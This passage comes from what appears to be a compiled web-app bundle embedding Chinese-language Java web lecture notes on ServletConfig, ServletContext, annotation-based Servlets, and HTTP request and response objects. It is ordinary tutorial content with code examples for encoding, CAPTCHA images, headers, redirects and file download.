@throws IOException\n     */\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        //1.输出ServletConfig\n        System.out.println(servletConfig);\n        //2.获取Servlet的名称\n        String servletName= servletConfig.getServletName();\n        System.out.println(servletName);\n        //3.获取字符集编码\n        String encoding = servletConfig.getInitParameter("encoding");\n        System.out.println(encoding);\n        //4.获取所有初始化参数名称的枚举\n        Enumeration<String> names = servletConfig.getInitParameterNames();\n        //遍历names\n        while(names.hasMoreElements()){\n            //取出每个name\n            String name = names.nextElement();\n            //根据key获取value\n            String value = servletConfig.getInitParameter(name);\n            System.out.println("name:"+name+",value:"+value);\n        }\n        //5.获取ServletContext对象\n        ServletContext servletContext = servletConfig.getServletContext();\n        System.out.println(servletContext);\n    }\n\n    /**\n     * 调用doGet方法\n     * @param req\n     * @param resp\n     * @throws ServletException\n     * @throws IOException\n     */\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        doGet(req,resp);\n    }\n}\n```\n\n![ServletConfig演示](./img/java/javaweb/Servlet-授课.assets/ServletConfig演示.png)\n\n# 3 ServletContext\n\n## 3.1 ServletContext概述\n\n### 3.1.1 基本介绍\n\nServletContext对象，它是应用上下文对象。每一个应用有且只有一个ServletContext对象。它可以实现让应用中所有Servlet间的数据共享。 \n\n### 3.1.2 生命周期\n\n出生——活着——死亡\n\n出生： 应用一加载，该对象就被创建出来了。一个应用只有一个实例对象。(Servlet和ServletContext都是单例的)\n\n活着：只要应用一直提供服务，该对象就一直存在。\n\n死亡：应用被卸载（或者服务器挂了），该对象消亡。\n\n### 3.1.3 域对象概念\n\n域对象的概念，它指的是对象有作用域，即有作用范围。\n\n域对象的作用，域对象可以实现数据共享。不同作用范围的域对象，共享数据的能力不一样。\n\n在Servlet规范中，一共有4个域对象。今天我们讲解的ServletContext就是其中一个。它也是我们接触的第一个域对象。它是web应用中最大的作用域，叫application域。每个应用只有一个application域。它可以实现整个应用间的数据共享功能。\n\n## 3.2 ServletContext的使用\n\n### 3.2 1 ServletContext介绍\n\n```\nServletContext 是应用上下文对象。每一个应用中只有一个 ServletContext 对象。\n作用：可以获得应用的全局初始化参数和达到 Servlet 之间的数据共享。\n生命周期：应用一加载则创建，应用被停止则销毁。\n```\n\n![](./img/java/javaweb/Servlet-授课.assets/ServletContext.png)\n\n### 3.2.2 域对象\n\n```\n域对象指的是对象有作用域。也就是有作用范围。域对象可以实现数据的共享。不同作用范围的域对象，共享数据的能力也不一样。\n\n在 Servlet 规范中，一共有 4 个域对象。ServletContext 就是其中的一个。它也是 web 应用中最大的作用域，也叫 application 域。它可以实现整个应用之间的数据共享！\n```\n\n\n\n### 3.2.3 ServletContext配置\n\nServletContext既然被称之为应用上下文对象，所以它的配置是针对整个应用的配置，而非某个特定Servlet的配置。它的配置被称为应用的初始化参数配置。\n\n配置的方式，需要在`<web-app>`标签中使用`<context-param>`来配置初始化参数。具体代码如下：\n\n```xml\n\x3c!--配置应用初始化参数--\x3e\n<context-param>\n    \x3c!--用于获取初始化参数的key--\x3e\n    <param-name>servletContextInfo</param-name>\n    \x3c!--初始化参数的值--\x3e\n    <param-value>This is application scope</param-value>\n</context-param>\n\x3c!--每个应用初始化参数都需要用到context-param标签--\x3e\n<context-param>\n    <param-name>globalEncoding</param-name>\n    <param-value>UTF-8</param-value>\n</context-param>\n```\n\n### 3.2.4 ServletContext常用方法\n\n```java\npublic class ServletContextDemo extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        //获取ServletContext对象\n        ServletContext context = getServletContext();\n\n        //获取全局配置的globalEncoding\n        String value = context.getInitParameter("globalEncoding");\n        System.out.println(value);\n\n        //获取应用的访问虚拟目录\n        String contextPath = context.getContextPath();\n        System.out.println(contextPath);\n\n        //根据虚拟目录获取应用部署的磁盘绝对路径\n        //获取b.txt文件的绝对路径\n        String b = context.getRealPath("/b.txt");\n        System.out.println(b);\n\n        //获取c.txt文件的绝对路径\n        String c = context.getRealPath("/WEB-INF/c.txt");\n        System.out.println(c);\n\n        //获取a.txt文件的绝对路径\n        String a = context.getRealPath("/WEB-INF/classes/a.txt");\n        System.out.println(a);\n\n\n        //向域对象中存储数据\n        context.setAttribute("username","zhangsan");\n\n        //移除域对象中username的数据\n        //context.removeAttribute("username");\n    }\n\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        doGet(req,resp);\n    }\n}\n```\n\n\n\n# 4 注解开发Servlet\n\n## 4.1 Servlet3.0规范\n\n首先，我们要先跟同学们明确一件事情，我们在《Tomcat和HTTP协议》课程中已经介绍了，我们使用的是Tomcat9，JavaEE规范要求是8，对应的Servlet规范规范应该是JavaEE8包含的4.x版本。\n\n但是，同学们要知道，在企业级应用的开发中，稳定远比追新版本重要的多。所以，我们虽然用到了Tomcat9和对应的JavaEE8，但是涉及的Servlet规范我们降板使用，用的是Servlet3.1版本。关于兼容性问题，同学们也无须担心，向下兼容的特性，在这里也依然适用。\n\n接下来，同学还有可能疑惑的地方就是，我们课程中明明使用的是Servlet3.1版本的规范，但是却总听老师提Servlet3.0规范，这两个到底有怎样的联系呢？\n\n现在就给同学们解惑，在大概十多年前，那会还是Servlet2.5的版本的天下，它最明显的特征就是Servlet的配置要求配在web.xml中，<b><font color=\'red\'>我们今天课程中在第4章节《注解开发Servlet》之前，全都是基于Servlet2.5规范编写的。</font></b>从2007年开始到2009年底，在这个时间段，软件开发开始逐步的演变，基于注解的配置理念开始逐渐出现，大量注解配置思想开始用于各种框架的设计中，例如：Spring3.0版本的Java Based Configuration，JPA规范，apache旗下的struts2和mybatis的注解配置开发等等。\n\nJavaEE6规范也是在这个期间设计并推出的，与之对应就是它里面包含了新的Servlet规范：<b><font color=\'red\'>Servlet3.0版本！</font></b>\n\n## 4.2 注解开发入门案例\n\n### 4.2.1 自动注解配置\n\n#### 1）配置步骤\n\n**第一步：创建JavaWeb工程，并移除web.xml**\n\n![Servlet注解开发1](./img/java/javaweb/Servlet-授课.assets/Servlet注解开发1.png)\n\n![Servlet注解开发2](./img/java/javaweb/Servlet-授课.assets/Servlet注解开发2.png)\n\n![注解开发Servlet移除web.xml](./img/java/javaweb/Servlet-授课.assets/注解开发Servlet移除web.xml.png)\n\n**第二步：编写Servlet**\n\n```java\n/**\n * 注解开发Servlet\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class ServletDemo1 extends HttpServlet {\n\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        doPost(req,resp);\n    }\n\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        System.out.println("Servlet Demo1 Annotation");\n    }\n}\n```\n\n**第三步：使用注解配置Servlet**\n\n![注解配置Servlet映射](./img/java/javaweb/Servlet-授课.assets/注解配置Servlet映射.png)\n\n**第四步：测试**\n\n![注解配置Servlet测试](./img/java/javaweb/Servlet-授课.assets/注解配置Servlet测试.png)\n\n#### 2）注解详解\n\n```java\n/**\n * WebServlet注解\n * @since Servlet 3.0 (Section 8.1.1)\n */\n@Target(ElementType.TYPE)\n@Retention(RetentionPolicy.RUNTIME)\n@Documented\npublic @interface WebServlet {\n\n    /**\n     * 指定Servlet的名称。\n     * 相当于xml配置中<servlet>标签下的<servlet-name>\n     */\n    String name() default "";\n\n    /**\n     * 用于映射Servlet访问的url映射\n     * 相当于xml配置时的<url-pattern>\n     */\n    String[] value() default {};\n\n    /**\n     * 相当于xml配置时的<url-pattern>\n     */\n    String[] urlPatterns() default {};\n\n    /**\n     * 用于配置Servlet的启动时机\n     * 相当于xml配置的<load-on-startup>\n     */\n    int loadOnStartup() default -1;\n\n    /**\n     * 用于配置Servlet的初始化参数\n     * 相当于xml配置的<init-param>\n     */\n    WebInitParam[] initParams() default {};\n\n    /**\n     * 用于配置Servlet是否支持异步\n     * 相当于xml配置的<async-supported>\n     */\n    boolean asyncSupported() default false;\n\n    /**\n     * 用于指定Servlet的小图标\n     */\n    String smallIcon() default "";\n\n    /**\n     * 用于指定Servlet的大图标\n     */\n    String largeIcon() default "";\n\n    /**\n     * 用于指定Servlet的描述信息\n     */\n    String description() default "";\n\n    /**\n     * 用于指定Servlet的显示名称\n     */\n    String displayName() default "";\n}\n```\n\n### 4.2.2 手动创建容器\n\n#### 1）前置说明\n\n在使用Servlet3.1版本的规范时，脱离了web.xml进行注解开发，它除了支持使用注解的配置方式外，还支持纯手动创建Servlet容器的方式。要想使用的话，必须遵循它的编写规范。它是从Servlet3.0规范才开始引入的，加入了一个新的接口：\n\n```java\npackage javax.servlet;\n\nimport java.util.Set;\n\n/**\n * 初始化Servlet容器必须实现此接口\n * 它是Servlet3.0规范提供的标准接口\n * @since Servlet 3.0\n */\npublic interface ServletContainerInitializer {\n     /**\n     * 启动容器时做一些初始化操作，例如注册Servlet,Filter,Listener等等。\n \t * @since Servlet 3.0\n     */\n    void onStartup(Set<Class<?>> c, ServletContext ctx) throws ServletException;\n}\n```\n\n同时可以利用@HandlesTypes注解，把要加载到onStartup方法中的类字节码传入进来，@HandlesTypes源码如下：\n\n```java\n/**\n * 用于指定要加载到ServletContainerInitializer接口实现了中的字节码\n * @see javax.servlet.ServletContainerInitializer\n * @since Servlet 3.0\n */\n@Target({ElementType.TYPE})\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface HandlesTypes {\n\n    /**\n     * 指定要加载到ServletContainerInitializer实现类的onStartUp方法中类的字节码。\n     * 字节码可以是接口，抽象类或者普通类。\n     */\n    Class[] value();\n}\n```\n\n#### 2）编写步骤\n\n**第一步：创建工程，并移除web.xml**\n\n![手动创建容器之创建工程](./img/java/javaweb/Servlet-授课.assets/手动创建容器之创建工程.png)\n\n![手动创建容器之移除web.xml](./img/java/javaweb/Servlet-授课.assets/手动创建容器之移除web.xml.png)\n\n**第二步：编写Servlet**\n\n```java\n/**\n * 注解开发Servlet 之 手动初始化容器\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class ServletDemo1 extends HttpServlet {\n\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        doPost(req,resp);\n    }\n\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        System.out.println("Servlet Demo1 Annotation manual");\n    }\n}\n```\n\n**第三步：创建初始化容器的类，并按照要求配置**\n\n```java\n/**\n * 初始化容器操作\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class MyServletContainerInitializer implements ServletContainerInitializer {\n\n    @Override\n    public void onStartup(Set<Class<?>> c, ServletContext ctx) throws ServletException {\n       \n    }\n}\n```\n\n在脱离web.xml时，要求在src目录下包含一个META-INF目录，位置和及字母都不能改变，且严格区分大小写。在目录中创建一个名称为`javax.servlet.ServletContainerInitializer`的文件，里面写实现了`ServletContainerInitializer`接口的全限定类名。如下图所示：\n\n![手动创建容器之初始化容器的配置](./img/java/javaweb/Servlet-授课.assets/手动创建容器之初始化容器的配置.png)\n\n**第四步：编写注册Servlet的代码**\n\n![手动创建容器之编写注册Servlet的代码](./img/java/javaweb/Servlet-授课.assets/手动创建容器之编写注册Servlet的代码.png)\n\n**第五步：测试**\n\n![手动创建容器之测试](./img/java/javaweb/Servlet-授课.assets/手动创建容器之测试.png)\n\n# 5 Servlet应用案例-学生管理系统\n\n## 5.1 案例介绍\n\n### 5.1.1 案例需求\n\n在昨天的课程讲解中，我们用Tomcat服务器替代了SE阶段的学生管理系统中自己写的服务器。今后我们进入企业肯定也会使用成型的产品，而不会自己去写服务器（除非是专门做应用服务器的公司）。\n\n从今天开始案例正式进入了编码阶段，它是延续了JavaSE阶段课程的学生管理系统。并且分析了SE中系统的各类问题，在JavaWeb阶段学习，就是要通过每天的学习，逐步解决SE阶段学生管理系统中的遗留问题。\n\n今天，我们将会去解决下面这个问题：<b><font color=\'red\'>保存学生</font></b>。也就是让数据真正的动起来，本质就是通过html发送一个请求，把表单中填写的数据带到服务器端。因为每个使用者在表单填写的内容不一样，所有最终存起来的也就不一样了。\n\n### 5.1.2 技术选型\n\n这是一个全新的案例，而不是在SE阶段的案例上进行改造。所以我们用项目的方式来去约束这个案例。\n\n任何一个项目，在立项之初都会有技术选型，也就是定义使用的技术集，这里面包含很多。例如：表现层技术，持久层技术，数据库技术等等。\n\n我们今天只针对表现层进行编码，所以就先来定义表现层技术。表现层技术的选型就是Servlet+HTML的组合。\n\n由HTML中编写表单，Servlet中定义接收请求的方法，最终把表单数据输出到控制台即可。<b>我们Servlet的配置方式仍然选择基于web.xml的配置方式。</b>\n',Pr={data:function(){return{MainComponent:Dr}}},Nr=Pr,qr=Object(u["a"])(Nr,Ar,Ir,!1,null,"e9f59c5e",null),Hr=qr.exports,Br=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},Fr=[],Ur='# Request&Response-授课\n\n# 1 响应对象\n\n## 1.1 响应对象概述\n\n### 1.1.1 关于响应\n\n响应，它表示了服务器端收到请求，同时也已经处理完成，把处理的结果告知用户。简单来说，指的就是服务器把请求的处理结果告知客户端。在B/S架构中，响应就是把结果带回浏览器。\n\n响应对象，顾名思义就是用于在JavaWeb工程中实现上述功能的对象。\n\n### 1.1.2 常用响应对象\n\n响应对象也是是Servlet规范中定义的，它包括了协议无关的和协议相关的。\n\n协议无关的对象标准是：ServletResponse接口\n\n协议相关的对象标准是：HttpServletResponse接口\n\n类结构图如下：\n\n![响应类视图](./img/java/javaweb/Request&Response-授课.assets/响应类视图.png)\n\n我们课程中涉及的响应对象都是和HTTP协议相关的。即使用的是HttpServletResponse接口的实现类。\n\n这里有些同学可能会产生疑问，我们在使用Servlet时，需要定义一个类，然后实现Servlet接口（或者继承它的实现类）。现在我们想要实现响应功能，要不要定义一个类，然后实现HttpServletResponse接口呢？\n\n<b>此问题的答案是否定的，我们无需这么做。</b>我们只需要在自己写的Servlet中直接使用即可，因为这个对象的实现类是由Tomcat提供的，无须我们自定义。同时它还会帮我们把对象创建出来并传入doGet和doPost方法中。\n\n## 1.2 常用方法介绍 \n\n在HttpServletResponse接口中提供了很多方法，接下来我们通过API文档，来了解一下这些方法。\n\n![响应方法详解](./img/java/javaweb/Request&Response-授课.assets/响应方法详解.png)\n\n常用状态码：\n\n| 状态码 |                            说明                            |\n| :----: | :--------------------------------------------------------: |\n|  200   |                          执行成功                          |\n|  302   | 它和307一样，都是用于重定向的状态码。只是307目前已不再使用 |\n|  304   |                 请求资源未改变，使用缓存。                 |\n|  400   |            请求错误。最常见的就是请求参数有问题            |\n|  404   |                       请求资源未找到                       |\n|  405   |                      请求方式不被支持                      |\n|  500   |                     服务器运行内部错误                     |\n\n状态码首位含义：\n\n| 状态码 |    说明    |\n| :----: | :--------: |\n|  1xx   |    消息    |\n|  2xx   |    成功    |\n|  3xx   |   重定向   |\n|  4xx   | 客户端错误 |\n|  5xx   | 服务器错误 |\n\n## 1.3 响应对象的使用示例\n\n### 1.3.1 响应-字节流输出中文问题\n\n```java\n/**\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class ResponseDemo1 extends HttpServlet {\n\n    /**\n     * 演示字节流输出的乱码问题\n     */\n    public void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        /**\n         * 问题：\n         * \t  String str = "字节流中文乱码问题";\n         * \t     使用字节流输出，会不会产生中文乱码？\n         * 答案：\n         * \t  会产生乱码\n         * 原因：\n         * \tString str = "字节流中文乱码问题"; 在保存时用的是IDEA创建文件使用的字符集UTF-8。\n         * \t到浏览器上显示，chrome浏览器和ie浏览器默认的字符集是GB2312(其实就是GBK)，存和取用的不是同一个码表，就会产生乱码。\n         *\n         * 引申：\n         *   如果产生了乱码，就是存和取用的不是同一个码表\n         * 解决办法：\n         *   把存和取的码表统一。\n         */\n        String str = "字节流输出中文的乱码问题";//UTF-8的字符集，此时浏览器显示也需要使用UTF-8的字符集。\n        //1.拿到字节流输出对象\n        ServletOutputStream sos = response.getOutputStream();\n        /**\n         * 解决办法：\n         * \t第一种解决办法：\n         *      修改浏览器的编码，使用右键——编码——改成UTF-8。(不推荐使用，我们的应用尽量不要求用户取做什么事情)\n         *      ie和火狐浏览器可以直接右键设置字符集。而chrome需要安装插件，很麻烦。\n         * \t第二种解决办法： (不建议使用，因为不好记)\n         *  \t向页面上输出一个meta标签，内容如下： <meta http-equiv="content-type" content="text/html;charset=UTF-8">\n         *      其实它就是指挥了浏览器，使用哪个编码进行显示。\n         *  第三种解决办法：\n         * \t\t设置响应消息头，告知浏览器响应正文的MIME类型和字符集\n         * \t\tresponse.setHeader("Content-Type","text/html;charset=UTF-8");\n         * \t第四种解决办法：我们推荐使用的办法\n         * \t    它的本质就是设置了一个响应消息头\n         *  \tresponse.setContentType("text/html;charset=UTF-8");\n         */\n        //第二种解决办法：sos.write("<meta http-equiv=\'content-type\' content=\'text/html;charset=UTF-8\'>".getBytes());\n        //第三种解决办法：response.setHeader("Content-Type","text/html;charset=UTF-8");\n        //第四种解决办法：\n        response.setContentType("text/html;charset=UTF-8");\n        //2.把str转换成字节数组之后输出到浏览器\n        sos.write(str.getBytes("UTF-8")); \n    }\n\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        doGet(request, response);\n    }\n}\n```\n\n![ResponseDemo1](./img/java/javaweb/Request&Response-授课.assets/ResponseDemo1.png)\n\n### 1.3.2 响应-字符流输出中文问题\n\n```java\n/**\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class ResponseDemo2 extends HttpServlet {\n\n    /**\n     * 字符流输出中文乱码\n     * @param request\n     * @param response\n     * @throws ServletException\n     * @throws IOException\n     */\n    public void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        String str = "字符流输出中文乱码";\n        //response.setCharacterEncoding("UTF-8");\n\n        //设置响应正文的MIME类型和字符集\n        response.setContentType("text/html;charset=UTF-8");\n        //1.获取字符输出流\n        PrintWriter out = response.getWriter();\n        //2.使用字符流输出中文\n        /**\n         * 问题：\n         * \tout.write(str); 直接输出，会不会产生乱码\n         * 答案：\n         * \t会产生乱码\n         * 原因：\n         * \t存用的什么码表：UTF-8\n         *  在浏览器取之前，字符流PrintWriter已经获取过一次了，PrintWriter它在取的时候出现了乱码。\n         * \t浏览器取默认用的是GBK。（本地系统字符集）\n         *\n         *  UTF-8(存)————>PrintWriter ISO-8859-1(取)\t\t\t\t\t乱\n         *  PrintWirter ISO-8859-1(存)————>浏览器 GBK(取)\t\t\t\t乱\n         *\n         * 解决办法：\n         * \t改变PrintWriter的字符集，PrintWriter是从response对象中获取的，其实设置response的字符集。\n         *  注意：设置response的字符集，需要在拿流之前。\n         *  response.setCharacterEncoding("UTF-8");\n         *\n         * response.setContentType("text/html;charset=UTF-8");\n         * 此方法，其实是做了两件事：\n         * \t\t1.设置响应对象的字符集（包括响应对象取出的字符输出流）\n         * \t\t2.告知浏览器响应正文的MIME类型和字符集\n         */\n\n        out.write(str);\n    }\n\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        doGet(request, response);\n    }\n}\n```\n\n![ResponseDemo2](./img/java/javaweb/Request&Response-授课.assets/ResponseDemo2.png)\n\n### 1.3.3 响应-生成验证码\n\n```java\n/**\n * @author 黑马程序员\n * @Company http://www.itheima.com\n *\n */\npublic class ResponseDemo3 extends HttpServlet {\n\n    /**\n     * 输出图片\n     * @param request\n     * @param response\n     * @throws ServletException\n     * @throws IOException\n     */\n    public void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        int width = 200;\n        int height = 35;\n        /**\n         * 实现步骤:\n         * \t1.创建图像内存对象\n         *  2.拿到画笔\n         *  3.设置颜色，画矩形边框\n         *  4.设置颜色，填充矩形\n         *  5.设置颜色，画干扰线\n         *  6.设置颜色，画验证码\n         *  7.把内存图像输出到浏览器上\n         */\n        //创建内存图像\n        BufferedImage image = new BufferedImage(width,height,BufferedImage.TYPE_INT_RGB);//参数：宽度，高度 （指的都是像素），使用的格式（RGB）\n        Graphics g = image.getGraphics();//画笔就一根\n\n        //设置颜色\n        g.setColor(Color.BLUE);\n        //画边框\n        g.drawRect(0, 0, width, height);\n\n        //设置颜色\n        g.setColor(Color.GRAY);\n        //填充矩形\n        g.fillRect(1, 1, width-2, height-2);\n\n        //设置颜色\n        g.setColor(Color.WHITE);\n        //拿随机数对象\n        Random r = new Random();\n        //画干扰线 10条\n        for(int i=0;i<10;i++){\n            g.drawLine(r.nextInt(width), r.nextInt(height),r.nextInt(width), r.nextInt(height));\n        }\n\n        //设置颜色\n        g.setColor(Color.RED);\n        //改变字体大小\n        Font font = new Font("宋体", Font.BOLD,30);//参数：1字体名称。2.字体样式 3.字体大小\n        g.setFont(font);//设置字体\n        //画验证码\t4个\n        int x = 35;//第一个数的横坐标是35像素\n        for(int i=0;i<4;i++){\n            //r.nextInt(10)+""这种写法效率是十分低的\n            g.drawString(String.valueOf(r.nextInt(10)), x, 25);\n            x+=35;\n        }\n\n        //输出到浏览器上\n        //参数： 1.内存对象。2.输出的图片格式。3.使用的输出流\n        ImageIO.write(image, "jpg", response.getOutputStream());\n    }\n\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        doGet(request, response);\n    }\n\n}\n```\n\n![ResponseDemo3](./img/java/javaweb/Request&Response-授课.assets/ResponseDemo3.png)\n\n### 1.3.4 设置响应消息头-控制缓存\n\n```java\n/**\n * 设置缓存时间\n * \t使用缓存的一般都是静态资源\n *  动态资源一般不能缓存。\n *  我们现在目前只掌握了Servlet，所以用Servlet做演示\n * @author 黑马程序员\n * @Company http://www.itheima.com\n *\n */\npublic class ResponseDemo4 extends HttpServlet {\n\n    public void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        String str = "设置缓存时间";\n        /*\n         * 设置缓存时间，其实就是设置响应消息头：Expires 但是值是一个毫秒数。\n         * 使用的是\n         * \tresponse.setDateHeader();\n         *\n         * 缓存1小时，是在当前时间的毫秒数上加上1小时之后的毫秒值\n         */\n        response.setDateHeader("Expires",System.currentTimeMillis()+1*60*60*1000);\n        response.setContentType("text/html;charset=UTF-8");\n        response.getOutputStream().write(str.getBytes());\n    }\n\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        doGet(request, response);\n    }\n\n}\n```\n\n![ResponseDemo4_chrome](./img/java/javaweb/Request&Response-授课.assets/ResponseDemo4_chrome.png)\n\n![ResponseDemo4_ie](./img/java/javaweb/Request&Response-授课.assets/ResponseDemo4_ie.png)\n\n### 1.3.5 设置响应消息头定时刷新\n\n```java\n/**\n * 设置响应消息头：\n * 通过定时刷新演示添加消息头\n * @author 黑马程序员\n * @Company http://www.itheima.com\n *\n */\npublic class ResponseDemo5 extends HttpServlet {\n\n    public void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        String str = "用户名和密码不匹配，2秒后转向登录页面...";\n        response.setContentType("text/html;charset=UTF-8");\n        PrintWriter out = response.getWriter();\n        out.write(str);\n        //定时刷新，其实就是设置一个响应消息头\n        response.setHeader("Refresh", "2;URL=/login.html");//Refresh设置的时间单位是秒，如果刷新到其他地址，需要在时间后面拼接上地址\n    }\n\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        doGet(request, response);\n    }\n\n}\n```\n\n![ResponseDemo5](./img/java/javaweb/Request&Response-授课.assets/ResponseDemo5.png)\n\n### 1.3.6 请求重定向：注意地址栏发生改变。\n\n```java\n/**\n * 设置响应状态码，实现重定向\n * 重定向的特点：\n * \t 两次请求，地址栏改变，浏览器行为，xxxx\n * @author 黑马程序员\n * @Company http://www.itheima.com\n *\n */\npublic class ResponseDemo6 extends HttpServlet {\n\n    public void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        //1.设置响应状态码\n//\t\tresponse.setStatus(302);\n        //2.定向到哪里去: 其实就是设置响应消息头，Location\n//\t\tresponse.setHeader("Location", "ResponseDemo7");\n\n        //使用重定向方法\n        response.sendRedirect("ResponseDemo7");//此行做了什么事，请看上面\n    }\n\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        doGet(request, response);\n    }\n\n}\n```\n\n```java\n/**\n * 重定向的目的地\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class ResponseDemo7 extends HttpServlet {\n\n    public void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        response.getWriter().write("welcome to ResponseDemo7");\n    }\n\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        doGet(request, response);\n    }\n\n}\n```\n\n![ResponseDemo6](./img/java/javaweb/Request&Response-授课.assets/ResponseDemo6.png)\n\n### 1.3.7 响应和消息头组合应用-文件下载\n\n首先，在工程的web目录下新建一个目录uploads，并且拷贝一张图片到目录中，如下图所示：\n\n![文件下载的图片](./img/java/javaweb/Request&Response-授课.assets/文件下载的图片.png)\n\n文件下载的Servlet代码如下：\n\n```java\n/**\n * 文件下载\n * @author 黑马程序员\n * @Company http://www.itheima.com\n *\n */\npublic class ResponseDemo8 extends HttpServlet {\n\n    public void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        /*\n         * 文件下载的思路：\n         * \t\t1.获取文件路径\n         * \t\t2.把文件读到字节输入流中\n         * \t\t3.告知浏览器，以下载的方式打开（告知浏览器下载文件的MIME类型）\n         * \t\t4.使用响应对象的字节输出流输出到浏览器上\n         */\n        //1.获取文件路径（绝对路径）\n        ServletContext context = this.getServletContext();\n        String filePath = context.getRealPath("/uploads/6.jpg");//通过文件的虚拟路径，获取文件的绝对路径\n        //2.通过文件路径构建一个字节输入流\n        InputStream in  = new FileInputStream(filePath);\n        //3.设置响应消息头\n        response.setHeader("Content-Type", "application/octet-stream");//注意下载的时候，设置响应正文的MIME类型，用application/octet-stream\n        response.setHeader("Content-Disposition", "attachment;filename=1.jpg");//告知浏览器以下载的方式打开\n        //4.使用响应对象的字节输出流输出\n        OutputStream out = response.getOutputStream();\n        int len = 0;\n        byte[] by = new byte[1024];\n        while((len = in.read(by)) != -1){\n            out.write(by, 0, len);\n        }\n        in.close();\n    }\n\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        doGet(request, response);\n    }\n\n}\n```\n\n![ResponseDemo8](./img/java/javaweb/Request&Response-授课.assets/ResponseDemo8.png)\n\n### 1.3.8 响应对象注意事项\n\n**第一： response得到的字符流和字节流互斥，只能选其一**\n\n**第二：response获取的流不用关闭，由服务器关闭即可**\n\n```java\n/**\n * 使用Response对象获取流时候的注意事项：\n * \t1.我们使用response获取的流，可以不用关闭。服务器会给我们关闭。\n * \t2.在response对象中，字节流和字符流互斥，输出的时候，只能选择一个\n * @author zhy\n *\n */\npublic class ResponseDemo9 extends HttpServlet {\n\n    public void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        String str = "test";\n        response.getOutputStream().write(str.getBytes());\n        //response.getWriter().write(str);\n//\t\tresponse.getOutputStream().write("haha".getBytes());\n\n    }\n\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        doGet(request, response);\n    }\n\n}\n```\n\n![ResponseDemo9](./img/java/javaweb/Request&Response-授课.assets/ResponseDemo9.png)\n\n# 2 请求对象\n\n## 2.1 请求对象概述\n\n### 2.1.1 关于请求\n\n请求，顾明思议，就是使用者希望从服务器端索取一些资源，向服务器发出询问。在B/S架构中，就是客户浏览器向服务器发出询问。在我们的JavaEE工程中，客户浏览器发出询问，要遵循HTTP协议所规定的。\n\n请求对象，就是在JavaEE工程中，用于发送请求的对象。我们常用的对象就是ServletRequest和HttpServletRequest，它们的区别就是是否和HTTP协议有关。\n\n### 2.1.2 常用请求对象\n\n![请求对象的类试图](./img/java/javaweb/Request&Response-授课.assets/请求对象的类试图.png)\n\n## 2.2 常用方法介绍\n\n![Request方法详解](./img/java/javaweb/Request&Response-授课.assets/Request方法详解.png)\n\n## 2.3 请求对象的使用示例\n\n### 2.3.1 请求对象常用方法1-获取各种路径\n\n```java\n/**\n * 请求对象的各种信息获取\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class RequestDemo1 extends HttpServlet {\n\n    public void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n\n        //本机地址：服务器地址\n        String localAddr = request.getLocalAddr();\n        //本机名称：服务器名称\n        String localName = request.getLocalName();\n        //本机端口：服务器端口\n        int localPort = request.getLocalPort();\n        //来访者ip\n        String remoteAddr = request.getRemoteAddr();\n        //来访者主机\n        String remoteHost = request.getRemoteHost();\n        //来访者端口\n        int remotePort = request.getRemotePort();\n        //统一资源标识符\n        String URI = request.getRequestURI();\n        //统一资源定位符\n        String URL = request.getRequestURL().toString();\n        //获取查询字符串\n        String queryString = request.getQueryString();\n        //获取Servlet映射路径\n        String servletPath = request.getServletPath();\n\n        //输出内容\n\t\tSystem.out.println("getLocalAddr() is :"+localAddr);\n\t\tSystem.out.println("getLocalName() is :"+localName);\n\t\tSystem.out.println("getLocalPort() is :"+localPort);\n\t\tSystem.out.println("getRemoteAddr() is :"+remoteAddr);\n\t\tSystem.out.println("getRemoteHost() is :"+remoteHost);\n\t\tSystem.out.println("getRemotePort() is :"+remotePort);\n\t\tSystem.out.println("getRequestURI() is :"+URI);\n\t\tSystem.out.println("getRequestURL() is :"+URL);\n        